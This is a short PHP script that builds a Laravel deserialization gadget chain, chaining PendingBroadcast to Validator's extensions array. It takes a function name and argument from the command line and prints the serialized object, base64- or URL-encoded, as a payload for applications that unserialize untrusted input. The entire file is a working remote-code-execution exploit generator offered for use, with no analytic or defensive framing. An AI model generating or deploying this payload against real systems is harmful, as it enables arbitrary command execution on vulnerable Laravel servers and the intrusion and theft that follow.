<?php
/*
Author:monitor
description:
    laravel deserialization chain
*/
namespace Illuminate\Broadcasting
{
    class PendingBroadcast{
        protected $events;
        protected $event;
        public function __construct($events,$event){
            $this->events = $events;
            $this->event = $event; 
        }
        
    }
}
namespace Illuminate\Validation
{
    class Validator{
        public $extensions = [];
        public function __construct($function)
        {
            $this->extensions = [""=>$function];
        }
    }
}
namespace
{
    if($argc<4){
        echo "Usage:" .$argv[0]. "\n-b  base64_encode\n-u  url_encode\n<function><param>";
        exit();
    }
    $command = $argv[2];
    $param = $argv[3];
    $Validator = new \Illuminate\Validation\Validator($command);
    $pending = new \Illuminate\Broadcasting\PendingBroadcast($Validator,$param);
    if ($argv[1]=="-b"){
        echo base64_encode(serialize($pending));
    }elseif($argv[1]=="-u"){
        echo urlencode(serialize($pending));
    }

}